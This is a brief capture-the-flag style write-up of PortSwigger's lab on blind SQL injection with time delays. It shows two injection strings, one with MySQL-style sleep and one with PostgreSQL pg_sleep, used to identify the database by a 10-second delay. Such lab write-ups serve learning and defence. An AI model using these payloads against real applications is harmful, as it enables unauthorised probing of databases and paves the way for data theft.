# SQL Injection Part 5: Portswigger Labs
### [Lab 13: Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

**To solve: Make 10 second time delay**

**STEP 1:**
Find the database used & create time delay
```html
' || (SELECT sleep(10))-- //No time delay

' || (SELECT pg_sleep (10))-- //10 sec time delay
```
